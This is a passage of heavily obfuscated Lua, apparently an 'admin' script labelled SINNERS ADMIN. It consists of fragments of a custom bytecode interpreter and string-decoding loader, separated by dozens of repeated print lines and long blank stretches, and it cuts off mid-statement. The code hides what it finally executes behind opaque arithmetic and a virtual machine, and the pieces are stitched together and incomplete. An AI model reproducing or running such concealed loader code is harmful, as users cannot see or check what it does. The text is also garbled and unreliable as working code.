(48>(3390 -(346 + 643)))) then v173=v95[v102[65 -(29 + 33)]];v174=nil;v286=1;end if ((1346<(4010 -(347 + 476))) and (v286==1)) then v267=1655 -(1530 + 124);break;end end end end end end break;end if ((((5745 -2884) -(1224 + 160))>=(32 + 1028)) and (v171==(1734 -(451 + 1283)))) then local v239=0 -0;while true do if (((1570 + 807)>(398 -200)) and (v239==(0 -0))) then v172=0 + 0;v173=nil;v239=1 + (0 -0);end if ((v239==((8 -6) -1)) or ((1264 + 1179)<=(2699 -1894))) then v171=1888 -(1673 + 214);break;end end end end break;end if (((379 + 3542)>=(420 + 1009)) and (v170==(544 -(432 + 112)))) then v171=0 + 0;v172=nil;v170=(1 -0) -(0 -0);end if (((49 -((1892 -(560 + 1290)) + 6))==v170) or ((525 + 2256)<=(768 + 1960))) then v173=nil;v174=nil;v170=1739 -(1673 + 64);end end elseif (((3155 -2255)>=(2354 -1563)) and (v103==28)) then local v207=0;local v208;local v209;local v210;while true do if (((14483 -(6628 + 3673))>(3790 -1312)) and (v207==(0 + 0))) then v208=787 -(472 + 315);v209=nil;v207=(279 + 640) -(694 + 224);end if (((1384 -(398 + 663))<(29 + 851)) and (1==v207)) then v210=nil;while true do if ((v208==(0 -0)) or ((4697 + 280)<(68 + 431 + 956))) then local v258=(0 -0) -0;while true do if ((v258==0) or (4162<=(64 + 64))) then v209=1599 -(744 + 513 + 342);v210=nil;v258=1 + 0;end if ((((11954 -(898 + 691)) -6932)==(8036 -4603)) and (v258==1)) then v208=(1 -0) + 0;break;end end end if ((((5591 -(95 + 216)) -3570)<(7834 -4999)) and (v208==(1 -0))) then while true do if (((1782 + 3145)>(3750 -(1241 + 578))) and (v209==(426 -(48 + 378)))) then v210=v100[v102[7 -3]];if ( not v210 or (968==(2512 -(206 + 498)))) then InstrPoint=InstrPoint + 1;else local v293=0 -0;local v294;while true do if (((3191 -(8 + 1181))<(4585 -(286 + 299))) and (v293==(0 -0))) then v294=0 + 0;while true do if (((11264 -8573)>(2418 + 161)) and (v294==((4034 -2658) -(626 + 750)))) then v100[v102[2]]=v210;InstrPoint=v102[11 -8];break;end end break;end end end break;end end break;end end break;end end elseif (((7 + 716)==(1194 -(135 + 336))) and  not v100[v102[5 -3]]) then v72=v72 + (3 -2);else v72=v102[6 -3];end elseif ((3471>(1928 + 1106)) and (v103<=(118 -(69 + 15)))) then if ((v103<=(1984 -(628 + 191 + 1134))) or ((2773 -(674 + 4))==(7245 -5262))) then if ((v103>((1067 -(899 + 167)) + 29)) or (4624==(9208 -5431))) then v100[v102[(419 + 455) -(622 + 250)]]=v29(v95[v102[3]],nil,v37);else for v186=v102[5 -3],v102[2 + 1] do v100[v186]=nil;end end elseif (((4558 -(4480 -2386))==(2685 -(86 + 37 + 98))) and (v103<=32)) then local v177=1524 -(459 + 95 + 970);local v178;local v179;while true do if ((v177==(1302 -(919 + 382))) or (905>=2733)) then while true do if ((0==v178) or (4357<=(186 + 468))) then v179=v102[5 -3];v100[v179]=v100[v179](v13(v100,v179 + 1 + 0,v102[383 -(234 + 146)]));break;end end break;end if ((v177==(0 -0)) or ((969 + 1158)<=(278 + 121))) then v178=(1601 -(822 + 779)) + 0;v179=nil;v177=1650 -(1078 + 571);end end elseif ((v103>(89 -56)) or ((42 + 89)>(405 -217))) then if (((1167 + 2472)>=(131 + 164)) and (v100[v102[4 -2]]~=v102[(39 -24) -11])) then v72=v72 + 1;else v72=v102[3];end else v100[v102[2]]=v102[3];end elseif (((470 + 1444)>(1258 + 125)) and (v103<=(14 + 22))) then if (((296 + 656)>(2193 -1372)) and (v103==(256 -(132 + 89)))) then v100[v102[681 -(213 + 466)]]=v100[v102[1833 -(111 + 1719)]];else v100[v102[2]]={};end elseif (((1068 -(577 + 12))==(2091 -(1429 + 183))) and (v103<=(27 + (16 -6)))) then local v182=0 -0;local v183;local v184;local v185;while true do if (((5133 -2757)<(2957 + 712)) and (v182==(0 -0))) then v183=0 -0;v184=nil;v182=326 -(112 + 213);end if (((2705 -(25 + 89))>(2563 -((3819 -2298) + 191))) and (v182==1)) then v185=nil;while true do if ((v183==(1434 -(395 + 1038))) or (1794>(5373 -((3032 -(160 + 1157)) + 277)))) then for v249=458 -(417 + (1672 -(1097 + 535))), #v99 do local v250=505 -(145 + 360);local v251;local v252;local v253;while true do if (((3039 + (1278 -(112 + 186)))>(2872 -(1419 + 229))) and (v250==1)) then v253=nil;while true do if ((v251==1) or ((5220 -(512 + 860))<3318)) then while true do if (((18 + 563)<(2819 -(136 + 860))) and (0==v252)) then v253=v99[v249];for v300=0 + 0, #v253 do local v301=0 + 0;local v302;local v303;local v304;local v305;while true do if ((v301==(1666 -(525 + 1141))) or (3365==4016)) then v302=(1147 + 631) -(887 + 891);v303=nil;v301=1;end if (((1151 + 648)<2012) and (v301==(962 -(299 + 661)))) then while true do if (((4955 -(953 + 644))<(4899 -(65 + (1740 -(231 + 1471))))) and (v302==1)) then v305=v303[1464 -((1231 -(330 + 329)) + (3158 -2268))];if (((5697 -(4210 -1283))==2770) and (v304==v100) and (v305>=v184)) then local v329=0;local v330;local v331;while true do if (((1112 -(51 + 930))<(1370 -(620 + 279))) and (v329==((0 -0) -0))) then v330=0 + 0;v331=nil;v329=684 -(268 + 415);end if ((v329==(651 -(228 + 422))) or (((142 -65) + 3774)>(2787 + 2157))) then while true do if ((v330==(0 -0)) or ((3731 -(279 + 292))<(504 + 374 + 1420))) then v331=0;while true do if ((v331==(0 + 0)) or ((3047 + 1502)==1373)) then v185[v305]=v304[v305];v303[2 -1]=v185;break;end end break;end end break;end end end break;end if (((4920 -(479 + 127))==(5793 -(281 + 1198))) and (v302==0)) then local v328=0 -0;while true do if (((567 + 1022)<=(8836 -5458)) and (v328==(1549 -(725 + 823)))) then v302=1 + 0;break;end if (((351 + (2006 -(111 + 792)))<=(2868 -(177 + 834 + 335))) and (v328==((0 + 0) -0))) then v303=v253[v300];v304=v303[1 + 0];v328=1 + 0;end end end end break;end if ((v301==(120 -(109 + 10))) or ((174 + (2477 -(20 + 360)))>(1588 + 989 + 509))) then v304=nil;v305=nil;v301=2 + 0;end end end break;end end break;end if ((((397 + 5011) -(1118 + 32))>=1724) and (v251==(0 -0))) then local v295=0 -0;while true do if ((v295==(864 -(847 + 17))) or ((3151 -(876 + 580))<=((1 -0) + 11))) then v252=904 -(409 + 495);v253=nil;v295=2 -1;end if (((9320 -5684)>655) and (v295==(1 + 0 + 0))) then v251=1 + 0;break;end end end end break;end if ((v250==(1478 -(255 + 1223))) or ((521 -372)>=(6059 -(394 + 1536)))) then v251=(0 + 0) -0;v252=nil;v250=1;end end end break;end if (((124 + 3392)>(3142 -1114)) and (v183==(0 -0))) then local v241=638 -(106 + 532);while true do if (((7121 -2835)==(5580 -(713 + (1111 -530)))) and ((3 -2)==v241)) then v183=1 + 0;break;end if (((848 -(27 + (1166 -(67 + 278))))==v241) or ((5692 -(1781 + 27))==(2230 -632))) then v184=v102[1 + 1];v185={};v241=1;end end end end break;end end elseif ((3665<4168) and (v103>(1534 -((2288 -(197 + 1404)) + 809)))) then local v212=0;local v213;local v214;local v215;local v216;while true do if (((6422 -((3323 -2562) + 726))>=((9856 + 1615) -(20927 -14049))) and (v212==(1 + 0))) then local v228=0 -0;while true do if (((482 -265)<=(6541 -(1662 + 185))) and (0==v228)) then v73=(v215 + v213) -((1 -0) + 0);v216=0;v228=1;end if ((3004<(3075 + 1006)) and (v228==(1 + 0))) then v212=2 + 0;break;end end end if ((v212==(0 -0)) or ((1455 -(7 + 974))>828)) then local v229=0 + 0 + 0;while true do if ((v229==(1855 -(70 + 1785))) or ((168 + 1138 + 622)==((6104 -(376 + 435)) -(784 + 893)))) then v213=v102[141 -(19 + 120)];v214,v215=v97(v100[v213](v13(v100,v213 + 1 + 0,v102[1871 -(830 + 1038)])));v229=1;end if ((v229==(2 -1)) or ((4691 -2980)==(5760 -(209 + 1520)))) then v212=1975 -(61 + 1913);break;end end end if ((v212==(2 + 0)) or ((5332 -(612 + 264))==(6396 -(13785 -10100)))) then for v242=v213,v73 do local v243=1717 -(674 + 1043);local v244;while true do if (((2143 -727)<(11975 -7582)) and (v243==(0 + 0))) then v244=0 + 0;while true do if (((132 -(114 + 18))==v244) or ((1953 -(298 + 52))>=(1406 + 248))) then v216=v216 + (2 -(1 + 0));v100[v242]=v214[v216];break;end end break;end end end break;end end else v72=v102[1438 -(467 + 968)];end v72=v72 + ((2164 -(337 + 7)) -(908 + 911));break;end end break;end end end end v71=3;end if (1==v71) then v74={...};v75=v12("#",...) -1;v71=2;end if (v71==3) then A,B=v27(v11(v76));if  not A[1] then local v104=v35[4][v72] or "?";error("Script error at ["   .. v104   .. "]:"   .. A[2]);else return v13(A,2,B);end break;end if (v71==0) then v72=1;v73= -1;v71=1;end end end;end if (0==v59) then v60=v35[1];v61=v35[2];v59=1;end end end return v29(v28(),{},v17)();end vv9());break;end if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v0=1;end if (v0==4) then v13=unpack or table.unpack;v14=tonumber;v15=nil;v0=5;end end end
--
--
print("SINNERS ADMIN")
---
---
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")

------
print("SINNERS ADMIN")

----
print("SINNERS ADMIN")

print("SINNERS ADMIN")

---------------------
print("SINNERS ADMIN")
---
print("SINNERS ADMIN")


print("SINNERS ADMIN")
------
print("SINNERS ADMIN")
--
print("SINNERS ADMIN")


----------------
print("SINNERS ADMIN")


----------------------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")
-----------
-------------------------
print("SINNERS ADMIN")


-----------
------------------
print("SINNERS ADMIN")

-----
print("SINNERS ADMIN")

print("SINNERS ADMIN")
----------------------------------------------------------
print("SINNERS ADMIN")






------------------------------------------------
print("SINNERS ADMIN")
















---------------------------------------
print("SINNERS ADMIN")























---------------------------------------
print("SINNERS ADMIN")


































































































































































































































































































































































do local v0=0;local v1;local v2;local v3;local v4;local v5;local v6;local v7;local v8;local v9;local v10;local v11;local v12;local v13;local v14;local v15;while true do if (v0==0) then v1=tonumber;v2=string.byte;v3=string.char;v4=string.sub;v0=1;end if (v0==4) then vv9());break;end if (v0==2) then v9=getfenv or function()return _ENV;end;v10=setmetatable;v11=pcall;v12=select;v0=3;end if (v0==1) then v5=string.gsub;v6=string.rep;v7=table.concat;v8=table.insert;v0=2;end if (v0==3) then v13=unpack or table.unpack;v14=tonumber;v15=nil;function v15(v16,v17)local v18=1;local v19;v16=v5(v4(v16,5),"..",function(v30)if (v2(v30,2)==79) then v19=v1(v4(v30,1,1));return "";else local v62=v3(v1(v30,16));if v19 then local v74=v6(v62,v19);v19=nil;return v74;else return v62;end end end);local function v20(v31,v32,v33)if v33 then local v63=0 -0;local v64;while true do if (v63==(0 + 0)) then v64=(v31/((6 -4)^(v32-(3 -2))))%(2^(((v33-(1 -0)) -(v32-(1804 -((2504 -954) + 253)))) + (4 -3) + (238 -(52 + 186))));return v64-(v64%1);end end else local v65=(1907 -(1904 + 1))^(v32-(1 + 0));return (((v31%(v65 + v65))>=v65) and ((2 -1) + 0)) or (0 + 0);end end local function v21()local v38=v2(v16,v18,v18);v18=v18 + 1;return v38;end local function v22()local v39,v40=v2(v16,v18,v18 + (7 -5));v18=v18 + (192 -(180 + 10));return (v40 * (636 -380)) + v39;end local function v23()local v41,v42,v43,v44=v2(v16,v18,v18 + 3);v18=v18 + (561 -(19 + 538));return (v44 * (16777816 -(297 + 303))) + (v43 * 65536) + (v42 * (212 + 16 + 28)) + v41;end local function v24()local v45=v23();local v46=v23();return (( -((1126 -(1021 + 103)) + 0) * v20(v46,(1597 -(1563 + 15)) + 13)) + 1 + 0) * ((1 + 1)^(v20(v46,25 -4,31) -((2344 -1839) + 518))) * ((((v20(v46,761 -(317 + 443),89 -69) * (2^(61 -29))) + v45)/((1 + 1)^(42 + 10))) + (230 -(220 + 9)));end local function v25(v34)local v47;if  not v34 then v34=v23();if (v34==(0 -0)) then return "";end end v47=v4(v16,v18,(v18 + v34) -(2 -1));v18=v18 + v34;local v48={};for v60=1913 -(855 + 1057), #v47 do v48[v60]=v3(v2(v4(v47,v60,v60)));end return v7(v48);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v49=0 -0;local v50;local v51;local v52;local v53;local v54;local v55;local v56;while true do if (v49==0) then local v71=0 -0;while true do if (v71==(1 + 0)) then v49=1;break;end if (v71==(0 + 0)) then local v93=0;while true do if (v93~=1) then else v71=1;break;end if (v93~=0) then else v50=0;v51=nil;v93=1;end end end end end if (3==v49) then v56=nil;while true do local v75=0 + 0;local v76;while true do if (v75==(0 -0)) then v76=0;while true do if (v76==(1 -0)) then if (v50~=(396 -(341 + 54))) then else local v99=0;while true do if (v99==(1 + 0)) then v56={};v50=2;break;end if (v99==0) then v54={v51,v52,nil,v53};v55=v23();v99=1;end end end if (v50~=(1762 -(1072 + 687))) then else local v100=267 -(260 + 7);local v101;while true do if ((1723 -(590 + 1133))~=v100) then else v101=0;while true do local v102=0;local v103;while true do if (v102==(1183 -(165 + 1018))) then v103=0 -0;while true do if (v103==0) then if (v101~=(1355 -(1113 + 241))) then else return v54;end if (v101==(0 -0)) then local v157=0 -0;local v158;while true do if (v157==0) then v158=0 + 0;while true do if (v158==1) then v101=1583 -(1505 + 77);break;end if (v158==(0 -0)) then local v204=0 + 0;while true do if (v204==(1721 -(277 + 1444))) then for v217=1277 -(698 + 578),v23() do v52[v217-1]=v28();end for v219=1135 -(792 + 342),v23() do v53[v219]=v23();end v204=1;end if (v204==(3 -2)) then v158=4 -3;break;end end end end break;end end end break;end end break;end end end break;end end end break;end if (v76==0) then local v96=0 -0;local v97;while true do if (0==v96) then v97=0;while true do if (v97~=0) then else if (v50~=(1505 -(1458 + 45))) then else local v104=0;while true do if (v104==(0 -0)) then local v109=0 + 0;while true do if (v109~=(0 + 0)) then else local v159=0;while true do if (v159==(1 + 0)) then v109=1 -0;break;end if (v159==0) then for v191=1,v55 do local v192=0;local v193;local v194;local v195;local v196;while true do if (v192==1) then v195=nil;v196=nil;v192=2;end if (v192~=2) then else while true do if (v193==0) then local v221=0;local v222;while true do if ((0 + 0)==v221) then v222=0 + 0;while true do if (v222==1) then v193=1 + 0;break;end if (v222~=(0 + 0)) then else local v237=0;while true do if (v237~=1) then else v222=1;break;end if (v237~=(146 -(54 + 92))) then else v194=0;v195=nil;v237=1 + 0;end end end end break;end end end if (v193==1) then v196=nil;while true do if (v194==(436 -(110 + 325))) then if (v195==(253 -(24 + 228))) then v196=v21()~=(868 -(518 + 350));elseif (v195==2) then v196=v24();elseif (v195~=(848 -(322 + 523))) then else v196=v25();end v56[v191]=v196;break;end if (v194~=(0 -0)) then else local v231=0 + 0;local v232;local v233;while true do if (v231==(91 -(17 + 74))) then v232=0;v233=nil;v231=512 -(45 + 466);end if (v231==(1 + 0)) then while true do if (v232~=(0 -0)) then else v233=0 -0;while true do if (v233~=(0 + 0)) then else local v248=0;while true do if (v248~=(179 -(119 + 60))) then else v195=v21();v196=nil;v248=1;end if (v248~=1) then else v233=55 -(36 + 18);break;end end end if (v233~=(1981 -(1651 + 329))) then else v194=1;break;end end break;end end break;end end end end break;end end break;end if (v192==0) then v193=0;v194=nil;v192=1;end end end v54[56 -(28 + 25)]=v21();v159=1 + 0;end end end if (1==v109) then v104=1;break;end end end if (v104==(1611 -(939 + 671))) then for v150=2 -1,v23() do local v151=0;local v152;local v153;local v154;while true do if (v151==1) then v154=nil;while true do if (v152~=1) then else while true do if (v153~=(0 + 0)) then else v154=v21();if (v20(v154,1 + 0,1 + 0)==0) then local v211=0;local v212;local v213;local v214;local v215;local v216;while true do if (v211~=(2 + 0)) then else v216=nil;while true do if (v212~=0) then else v213=525 -(411 + 114);v214=nil;v212=1 -0;end if (v212~=1) then else local v236=0;while true do if (v236~=(1 + 0)) then else v212=2;break;end if (0==v236) then v215=nil;v216=nil;v236=934 -(168 + 765);end end end if (v212==2) then while true do if (v213~=(1 + 1)) then else if (v20(v215,1020 -(405 + 614),1 + 0)~=(1 + 0)) then else v216[779 -(280 + 497)]=v56[v216[2 -0]];end if (v20(v215,1677 -(858 + 817),2)==1) then v216[3]=v56[v216[1966 -(272 + 1691)]];end v213=11 -8;end if (1~=v213) then else local v240=0;while true do if (v240~=(283 -(112 + 171))) then else v216={v22(),v22(),nil,nil};if (v214==0) then local v249=0 -0;while true do if (v249==(0 + 0)) then v216[1 + 2]=v22();v216[4]=v22();break;end end elseif (v214==1) then v216[1722 -(74 + 1645)]=v23();elseif (v214==2) then v216[738 -(309 + 426)]=v23() -((2 -0)^16);elseif (v214==3) then local v254=0;while true do if (v254~=0) then else v216[3]=v23() -(2^16);v216[8 -4]=v22();break;end end end v240=2 -1;end if (v240~=1) then else v213=1 + 1;break;end end end if (v213==(1739 -(1216 + 523))) then local v241=925 -(115 + 810);while true do if (v241~=0) then else v214=v20(v154,2,2 + 1);v215=v20(v154,4,6);v241=1 + 0;end if (v241==1) then v213=1 -0;break;end end end if (v213==(104 -(90 + 11))) then if (v20(v215,3,3)==(918 -(707 + 210))) then v216[4]=v56[v216[3 + 1]];end v51[v150]=v216;break;end end break;end end break;end if (v211==(0 -0)) then v212=290 -(20 + 270);v213=nil;v211=1997 -(1681 + 315);end if (v211~=1) then else v214=nil;v215=nil;v211=2 + 0;end end end break;end end break;end if (0==v152) then v153=0;v154=nil;v152=1 + 0;end end break;end if (v151==(437 -(142 + 295))) then v152=1883 -(1178 + 705);v153=nil;v151=3 -2;end end end v50=8 -5;break;end end end if (v50==0) then local v105=0;local v106;local v107;while true do if (v105~=(3 -2)) then else while true do if (v106~=0) then else v107=0 + 0;while true do if (v107==(0 + 0)) then local v184=634 -(174 + 460);while true do if (v184~=(0 + 0)) then else v51={};v52={};v184=1799 -(15 + 1783);end if ((1 + 0)~=v184) then else v107=1;break;end end end if (v107~=(1 + 0)) then else v53={};v50=1 + 0;break;end end break;end end break;end if (v105~=0) then else v106=0;v107=nil;v105=1;end end end v97=1 + 0;end if (v97~=1) then else v76=1 + 0;break;end end break;end end end end break;end end end break;end if (v49~=(2 -1)) then else local v72=0;while true do if (v72~=0) then else v52=nil;v53=nil;v72=1228 -(1134 + 93);end if (v72==1) then v49=261 -(218 + 41);break;end end end if (v49==2) then local v73=1352 -(993 + 359);while true do if ((981 -(99 + 881))~=v73) then else v49=2 + 1;break;end if (v73==(0 + 0)) then v54=nil;v55=nil;v73=1149 -(1146 + 2);end end end end end local function v29(v35,v36,v37)local v57=v35[1];local v58=v35[2];local v59=v35[3];return function(...)local v66=1;local v67= -1;local v68={...};local v69=v12("#",...) -1;local function v70()local v77=v57;local v78=Const;local v79=v58;local v80=v59;local v81=v27;local v82={};local v83={};local v84={};for v90=0 + 0,v69 do if ((((665 + 169) -430)==(539 -(14 + 121))) and (v90>=v80)) then v82[v90-v80]=v68[v90 + (2 -1)];else v84[v90]=v68[v90 + (361 -(126 + 234))];end end local v85=(v69-v80) + (1627 -(1222 + 404));local v86;local v87;while true do local v91=0 -0;local v92;while true do if (((6973 -4044)>=(1891 -(1069 + 559))) and (v91==(0 -0))) then v92=0 -0;while true do if ((v92==(1471 -(1036 + 435))) or ((2403 -(550 + 1427))>=(6605 -3206))) then local v98=0 -(0 + 0);while true do if (((3401 + 1096)>=(2490 + (3925 -2433))) and (v98==(0 -0))) then v86=v77[v66];v87=v86[2 -1];v98=1 + 0;end if ((v98==(1 + 0)) or ((1791 + 382)>(3888 + 692))) then v92=1 + 0;break;end end end if ((v92==(1 + 0)) or ((2743 -(2342 -(426 + 324)))==(3838 -(1035 + 733)))) then if ((v87<=(444 -(297 + 134))) or ((13848 -10128)>(4830 -(368 + 724)))) then if (((6481 -2683)==(354 + 3444)) and (v87<=(6 + 0))) then if (((7225 -5065)==(2556 -(285 + 111))) and (v87<=(551 -(224 + 325)))) then if ((v87<=(1106 -(16 + 1090))) or ((353 + 62)>=(2262 -(36 + 813)))) then if ((v86[2 -0]==v84[v86[5 -1]]) or ((2347 + 2049)<(1976 + 495))) then v66=v66 + (1202 -(1176 + 25));else v66=v86[1 + 2];end elseif (((5677 -2741)==(5210 -2274)) and (v87==(1345 -(21 + 1323)))) then local v110=0 + 0;local v111;local v112;local v113;while true do if ((v110==(1 + 0)) or ((2049 -(280 + 486))==(12764 -8814))) then v113=nil;while true do if ((v111==(1 + 0)) or ((1907 -(538 + (1905 -(1486 + 351))))>(3296 -(720 + 99 + 27)))) then v84[v112 + (1103 -(987 + (330 -215)))]=v113;v84[v112]=v113[v86[966 -(371 + 591)]];break;end if (((4926 -(1296 + (422 -278)))>=(2427 + 659)) and (v111==(0 + 0))) then local v187=0 + 0;local v188;while true do if (((934 + 1067)>(370 + 232)) and (v187==(0 + 0))) then v188=0 -0;while true do if ((((7087 -4224) -(43 + (499 -(86 + 315))))==((5730 -(662 + 836)) -(848 + 662))) and (v188==(1782 -(511 + 1270)))) then v111=1509 -(1139 + 369);break;end if ((v188==(0 + 0)) or ((10583 -7931)<(581 + 1512))) then v112=v86[1773 -(59 + 1712)];v113=v84[v86[439 -(254 + 182)]];v188=1815 -((3401 -(1156 + 823)) + 392);end end break;end end end end break;end if (((578 -326)==(344 -((213 -124) + 3))) and (v110==(301 -(39 + 262)))) then local v160=629 -(194 + 435);while true do if (((1608 -(1021 + 471))<(1671 -(85 + 554 + 624))) and (v160==(1509 -(147 + 1361)))) then v110=1228 -(261 + 966);break;end if (((1832 -403)<=(1347 + 2524)) and (v160==(0 + (462 -(204 + 258))))) then v111=676 -(406 + 270);v112=nil;v160=2 -1;end end end end else for v155=v86[(1273 -(335 + 936)) + 0],v86[1 + 2] do v84[v155]=nil;end end elseif ((v87<=(3 + 1)) or ((108 + 840)>(1656 + 2578))) then if (((5343 -(45 + 314))>(244 + 128)) and (v87==3)) then do return;end else local v114=0 -0;local v115;local v116;while true do if (((198 + 3762)<(9010 -4911)) and (v114==((836 -532) -(167 + 136)))) then for v165=(2 -1) + 0, #v83 do local v166=0 + 0;local v167;while true do if ((v166==((496 + 1197) -(1304 + 389))) or ((16999 -12312)<(173 + 191))) then v167=v83[v165];for v197=0 + 0, #v167 do local v198=0 -0;local v199;local v200;local v201;local v202;while true do if ((v198==(1 -0)) or ((401 -(7 + 213 + 159))==(239 + 146))) then v201=nil;v202=nil;v198=8 -6;end if ((v198==(698 -(233 + 465))) or ((3426 -1644)<=(304 + 1258))) then local v206=0 + 0;while true do if (((0 + 0)==v206) or ((495 -265)>(5082 -(959 + 125)))) then v199=0 + 0;v200=nil;v206=2 -1;end if (((9800 -6070)>(10105 -6700)) and (v206==(1205 -(180 + 1024)))) then v198=(2 -1) -0;break;end end end if ((v198==(1625 -(956 + 667))) or ((2531 + 1060)==(2861 + 1464))) then while true do if ((((1480 -(57 + 242)) -(90 + 809))==(2261 -(1168 + 811))) and (((2363 -(733 + 895)) -(681 + 36 + 18))==v199)) then local v226=566 -((972 -543) + 137);local v227;while true do if ((((1739 -(780 + 343)) + 2103)>=(1483 + 45)) and (v226==(0 + 0))) then v227=0 + 0;while true do if ((v227==(1 + 0 + (1506 -(921 + 585)))) or ((2680 -1849)==(5450 -(935 + 872)))) then v199=2 -1;break;end if ((v227==(0 + 0)) or ((4047 -(28 + 39))>=(5642 -(683 + 420)))) then local v238=0 + 0;while true do if (((4749 -(142 + 997))<=(2324 + 2348)) and (v238==((1 + 3) -3))) then v227=1 + 0;break;end if ((v238==(0 -0)) or ((10094 -6315)==(253 -50))) then v200=v167[v197];v201=v200[1 + 0];v238=1 + 0;end end end end break;end end end if ((v199==(2 -1)) or ((12942 -8196)<=(12314 -8180))) then v202=v200[(80 + 290) -(34 + 334)];if (((524 + (3864 -(661 + 1103)))>(1588 -1121)) and (v201==v84) and (v202>=v115)) then local v234=0 + 0;local v235;while true do if (((3295 -1595)<=(3057 + 249)) and (v234==(952 -(42 + 910)))) then v235=0 + 0;while true do if ((v235==(0 -0)) or ((4384 -1914)>(1308 + 1874 + 207))) then v116[v202]=v201[v202];v200[1 + 0]=v116;break;end end break;end end end break;end end break;end end end break;end end end break;end if (((1983 -1196)<=(1693 + 276)) and (v114==(0 + 0))) then local v161=0;while true do if (((5306 -(654 + 978))==(4929 -(805 + 450))) and (v161==(1041 -((3728 -2750) + 62)))) then v114=162 -(82 + 79);break;end if ((v161==(0 -0)) or ((19649 -15423)<(49 + 134))) then v115=v86[1449 -(99 + 1348)];v116={};v161=(1 -0) -0;end end end end end elseif ((v87==(9 -4)) or ((2947 -(543 + 514))>=(3164 + 98))) then local v117=0 + 0;local v118;local v119;local v120;while true do if ((v117==(313 -(246 + 67))) or ((6897 -4519)>=(1729 + 2069))) then v118=(1616 -(408 + 1208)) -0;v119=nil;v117=881 -(786 + 94);end if (((4019 -787)>(1711 -(2143 -(704 + 381)))) and (v117==(2 -1))) then v120=nil;while true do if (((1938 -((1836 -(118 + 36)) + 255))==v118) or ((2723 + 1470)<=(1113 -653))) then while true do if (((0 + 0)==v119) or ((4898 -2682)<=(1236 -593))) then v120=v86[2];v84[v120]=v84[v120](v84[v120 + (1767 -(394 + 1372))]);break;end end break;end if (((0 + 0)==v118) or ((371 + 1934)<=(3590 -(901 + 534)))) then local v189=1152 -(1140 + 12);while true do if ((v189==(0 + 0)) or ((1056 -641)==(2462 + 719))) then v119=0 + 0;v120=nil;v189=1 -0;end if ((((784 + 5050) -3794)<=(4012 -1469)) and (v189==(2 -1))) then v118=1 + 0;break;end end end end break;end end else local v121=1385 -(1007 + 378);local v122;while true do if (((215 + 3484)<=(1746 + 1978)) and (v121==(1295 -(173 + 1122)))) then v122=v86[2 + 0];v84[v122]=v84[v122](v13(v84,v122 + (1 -(0 -0)),v86[1936 -(326 + 1607)]));break;end end end elseif (((3203 -2381)==(2254 -1432)) and (v87<=(30 -21))) then if ((v87<=(2 + 5)) or ((5386 -2643)>(417 + 2395))) then if (((6133 -4080)>=(1482 -1009)) and (v84[v86[877 -(149 + 726)]]~=v86[641 -(305 + (1722 -(385 + 1005)))])) then v66=v66 + (567 -(51 + 515));else v66=v86[3 -0];end elseif ((v87>((1534 -945) -(89 + 492))) or ((5733 -(180 + 734))<=(357 + 1042))) then v84[v86[5 -3]]=v37[v86[5 -2]];else local v124=1718 -(576 + 1142);local v125;while true do if ((818<=(5286 -(73 + 701))) and (v124==(0 + 0))) then v125=v86[(2 -1) + 1];v84[v125](v13(v84,v125 + 1 + 0,v86[(4 -3) + (7 -5)]));break;end end end elseif ((v87<=(6 + 5)) or ((3076 -(665 + 44))==(1027 + 2751))) then if (((12 + 4044 + 299)>(2718 + 1503)) and (v87>(29 -19))) then local v126=0 + 0 + 0;local v127;local v128;while true do if ((v126==1) or ((1478 + 1343)<(1849 -(1242 + 361)))) then while true do if (((6215 -(383 + 1490))>=(12935 -9776)) and (v127==(0 + 0))) then v128=v86[1551 -(138 + 1411)];do return v13(v84,v128,v128 + v86[2 + 1]);end break;end end break;end if ((v126==(0 -0)) or ((10221 -7012)<(458 -((784 -504) + (119 -71))))) then local v163=0 -0;while true do if ((v163==(0 + 0)) or ((5002 -(1326 + 519))<(2765 -1158))) then v127=0 -0;v128=nil;v163=1 + 0;end if ((v163==(3 -2)) or (1176>=(7170 -2288))) then v126=1 + 0;break;end end end end else v84[v86[690 -(428 + 260)]]={};end elseif (((6722 -4188)==(3281 -(300 + 447))) and (v87>(1232 -(20 + 258 + 942)))) then v84[v86[5 -3]]=v86[3 + 0]~=(252 -(208 + 44));else v66=v86[641 -(222 + 416)];end elseif (((3184 -1282)==(7034 -5132)) and (v87<=((14 -7) + 13))) then if (((4325 -(38 + 819))<=(4296 -(33 + 1 + 483))) and (v87<=(13 + 3))) then if ((v87<=(6 + 8)) or ((265 + 3164)>(2808 + 2136))) then do return v84[v86[2 -0]];end elseif ((v87>(13 + 2)) or (4810<(2652 -(343 + 800)))) then local v131=411 -(124 + 287);local v132;local v133;while true do if ((v131==(1 -0)) or ((3118 -(1370 + 150))>=((9196 -5487) + 887))) then while true do if ((v132==(0 + 0)) or ((983 -(431 + 281 + 118))>(18 + 983 + 788))) then v133=v86[(645 -(51 + 592)) + 0];do return v13(v84,v133,v67);end break;end end break;end if ((v131==(0 + 0)) or ((7907 -5739)<(3995 -2406))) then v132=1132 -(606 + 526);v133=nil;v131=1 + 0;end end elseif (((90 + (2190 -(475 + 831)))<=(731 + 1769)) and v84[v86[2]]) then v66=v66 + ((1706 -(7 + 26)) -(1412 + 260));else v66=v86[14 -11];end elseif (((3013 -(910 + 175))>=(1000 + 7)) and (v87<=((134 -(10 + 115)) + 9))) then if (((4129 -976)<=((6118 -(191 + 275)) -1665)) and (v87==(789 -(625 + 147)))) then v84[v86[(594 + 1283) -(1818 + 57)]]=v36[v86[128 -(74 + 51)]];else v84[v86[4 -2]]=v86[(472 -(206 + 258)) -5];end elseif ((v87>(368 -(274 + (271 -196)))) or ((1581 -(11 + 1448))>=(68 + 3287))) then local v136=0 + 0;local v137;local v138;while true do if (((2142 + 2644)>=((3524 -(598 + 1287)) -983)) and (v136==(458 -(456 + 1)))) then while true do if (((1182 + (2217 -(715 + 509)))<(10109 -7584)) and (v137==(0 + 0))) then v138=v86[2 + 0];do return v84[v138](v13(v84,v138 + (2 -1),v86[8 -5]));end break;end end break;end if (((248 + 812 + 1465)==(3726 -1201)) and (v136==(0 + 0))) then v137=0 -(1710 -(784 + 926));v138=nil;v136=3 -2;end end else v37[v86[231 -((91 -29) + 166)]]=v84[v86[1293 -((1619 -(322 + 36)) + 30)]];end elseif (((608 + 373)<=(4650 -2958)) and (v87<=(84 -61))) then if (((1967 -(520 + 579))<(5122 -3365)) and (v87<=(1814 -(1791 + 2)))) then v84[v86[1076 -(77 + 997)]][v86[1131 -(1078 + 